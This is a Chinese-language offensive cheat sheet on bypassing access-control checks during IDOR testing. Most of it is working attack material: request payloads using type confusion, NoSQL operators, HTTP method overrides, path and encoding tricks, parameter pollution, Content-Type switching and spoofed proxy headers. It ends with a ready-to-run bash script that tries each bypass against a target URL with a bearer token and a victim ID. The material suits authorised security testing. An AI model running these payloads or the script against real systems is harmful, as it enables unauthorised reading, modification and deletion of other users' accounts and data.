# IDOR 绕过技巧详解

当基础 IDOR 测试返回 403/401 时，以下技巧可能绕过权限检查。核心原理是：前端代理和后端应用可能对同一请求有不同的理解。

---

## 1. ID 参数包装与类型混淆

后端可能只检查了 `id=int` 的情况，换个类型就绕过了：

```bash
# 原始请求（被拦截）
GET /api/users/1002

# 数组包装
GET /api/users?id[]=1002
POST -d '{"id":[1002]}'

# JSON 对象包装（NoSQL 风格）
POST -d '{"id":{"$eq":1002}}'
POST -d '{"id":{"$in":[1001,1002,1003]}}'

# 字符串化
GET /api/users/"1002"
POST -d '{"id":"1002"}'   # 原本是 int，换 string

# 浮点数
GET /api/users/1002.0

# 科学计数法
GET /api/users/1.002e3

# 负数索引（某些框架从末尾算）
GET /api/users/-1         # 最后一个用户（可能是管理员）
```

## 2. HTTP 方法切换

权限检查可能只加在了某些方法上：

```bash
# GET 有检查
GET /api/users/1002 → 403

# 但其他方法忘了
PUT /api/users/1002 → 200?
PATCH /api/users/1002 → 200?
DELETE /api/users/1002 → 200?
OPTIONS /api/users/1002 → 暴露 Allow 头
HEAD /api/users/1002 → 状态码泄露

# POST + _method 覆盖（Rails/Laravel）
POST /api/users/1002  -d '_method=PUT'
POST /api/users/1002  -H 'X-HTTP-Method-Override: PUT'
POST /api/users/1002  -H 'X-Method-Override: DELETE'
```

## 3. 路径变体绕过

前端代理和后端应用对路径的解析可能不一致：

```bash
# 原始（被拦截）
GET /api/users/1002

# API 版本降级（旧版可能没权限检查）
GET /api/v1/users/1002    # v2 有检查，v1 没有
GET /api/v0/users/1002

# 内部路径
GET /api/internal/users/1002
GET /internal-api/users/1002
GET /api/debug/users/1002

# 路径混淆
GET /api/users/1002/.     # trailing dot
GET /api/users/1002/      # trailing slash
GET /api//users//1002     # double slash
GET /api/users/./1002     # dot segment
GET /api/users/1002%00    # null byte
GET /api/users/1002;.js   # Tomcat/Nginx 解析差异
GET /api/users/1002..;/   # Spring 路径遍历

# 大小写变体
GET /API/Users/1002
GET /Api/USERS/1002
```

## 4. 编码绕过

```bash
# URL 编码
GET /api/users/%31%30%30%32          # 1002 的 URL 编码

# 双重 URL 编码
GET /api/users/%25%33%31%25%33%30%25%33%30%25%33%32

# Base64 编码（如果 ID 是 Base64）
# 原始 id=eyJ1c2VyX2lkIjoxMDAxfQ==  → 解码: {"user_id":1001}
# 篡改为 {"user_id":1002} → 重新 Base64 编码

# Unicode 编码
GET /api/users/１００２   # 全角数字

# Hex 编码
GET /api/users/0x3EA      # 1002 的十六进制

# 汉字编码 ID（SRC 实战案例）
# 有些系统用汉字的 Unicode 编码点作为 ID
# 例如 ID=4863 → 对应汉字"且丘世专" → URL 编码为 %E4%B8%94%E4%B8%98%E4%B8%96%E4%B8%93
GET /api/user?id=%E4%B8%94%E4%B8%98%E4%B8%96%E4%B8%93
# 遇到非数字 ID 时，先 URL 解码看是否为可读文本，再分析编码规律
```

## 4.5 参数拼接越权

当接口的正常参数无法直接越权时，尝试用 `&` 拼接额外的身份标识参数：

```bash
# 原始接口（只返回自己的信息，没有可修改的 ID 参数）
GET /gateway/api?Action=GetUser&Version=2020-06-01

# 拼接身份参数（从其他接口/功能中获取到的他人 ID）
GET /gateway/api?Action=GetUser&Version=2020-06-01&UserId=victim_id

# 常见可拼接参数名：userId, uid, user_id, account_id, memberId, owner
```

原理：接口原本从 session 取用户 ID，但如果请求中显式传了 UserId，后端可能优先使用请求参数。同一功能如果有多个等价接口（返回相同数据），每个都值得尝试拼接。

## 5. 参数污染 (HPP - HTTP Parameter Pollution)

不同后端对重复参数的处理不同：

```bash
# 同名参数重复
GET /api/users?id=1001&id=1002
# PHP/Apache → 取最后一个 (1002)
# ASP.NET   → 拼接 "1001,1002"
# Express   → 取第一个 (1001)
# Flask     → 取第一个 (1001)

# 如果前端检查第一个，后端用最后一个 → 绕过
GET /api/users?id=1001&id=1002
#              ↑前端检查这个  ↑后端用这个
```

```bash
# JSON 参数污染（重复 key）
POST -d '{"id":1001, "id":1002}'
# 不同 JSON 解析器对重复 key 的处理不同

# 嵌套参数覆盖
POST -d '{"user":{"id":1001},"user":{"id":1002}}'
```

## 6. Content-Type 切换

```bash
# JSON 请求被过滤
POST /api/users/update -H "Content-Type: application/json"
-d '{"id":1002,"name":"hacked"}'  → 403

# 换 XML（可能走不同的过滤器）
POST /api/users/update -H "Content-Type: application/xml"
-d '<user><id>1002</id><name>hacked</name></user>'  → 200?

# 换 form-urlencoded
POST /api/users/update -H "Content-Type: application/x-www-form-urlencoded"
-d 'id=1002&name=hacked'  → 200?

# 换 multipart
POST /api/users/update -H "Content-Type: multipart/form-data; boundary=---"
...boundary + id=1002  → 200?
```

## 7. Header 注入绕过

```bash
# IP 白名单绕过（如果后端信任这些头）
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# 路径覆盖（Nginx/Apache 反向代理）
X-Original-URL: /api/admin/users/1002
X-Rewrite-URL: /api/admin/users/1002

# 自定义用户标识覆盖
X-User-Id: 1002
X-Account-Id: 1002
X-Custom-Auth: admin
```

## 8. 自动化绕过测试脚本

```bash
#!/bin/bash
# 用法: bash idor_bypass.sh https://target.com/api/users TOKEN VICTIM_ID
BASE="$1"
TOKEN="$2"
VID="$3"
AUTH="Authorization: Bearer $TOKEN"

echo "=== Method Bypass ==="
for m in GET POST PUT PATCH DELETE HEAD OPTIONS; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $m "$BASE/$VID" -H "$AUTH")
    echo "$m → $code"
done

echo "=== Path Variants ==="
for path in "$BASE/$VID/" "$BASE/$VID/." "$BASE//$VID" "$BASE/$VID%00" "$BASE/$VID;.js"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$path" -H "$AUTH")
    echo "$path → $code"
done

echo "=== Version Downgrade ==="
for ver in v1 v0 internal debug; do
    url=$(echo "$BASE" | sed "s|/v[0-9]*/|/$ver/|")
    code=$(curl -s -o /dev/null -w "%{http_code}" "$url/$VID" -H "$AUTH")
    echo "$ver → $code"
done

echo "=== Parameter Pollution ==="
code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE?id=self&id=$VID" -H "$AUTH")
echo "HPP → $code"

echo "=== Type Confusion ==="
for payload in '{"id":['$VID']}' '{"id":"'$VID'"}' '{"id":{"$eq":'$VID'}}'; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE" -H "$AUTH" -H "Content-Type: application/json" -d "$payload")
    echo "$payload → $code"
done
```

## 绕过思路决策树

```
403/401？
├─ 换 HTTP 方法 (PUT/PATCH/DELETE)
│  └─ 200? → 方法级 IDOR
├─ 换路径变体 (/., //, ;.js, %00)
│  └─ 200? → 路径解析差异绕过
├─ 换 API 版本 (v1/v0/internal)
│  └─ 200? → 旧版本未修复
├─ 参数包装 (数组/JSON对象/字符串)
│  └─ 200? → 类型检查不严
├─ 参数污染 (HPP)
│  └─ 200? → 前后端参数取值不一致
├─ Content-Type 切换
│  └─ 200? → 不同解析器不同过滤
├─ Header 注入 (X-Forwarded-For, X-Original-URL)
│  └─ 200? → 代理信任内部头
└─ 都失败 → 权限检查可能确实到位，换其他端点
```
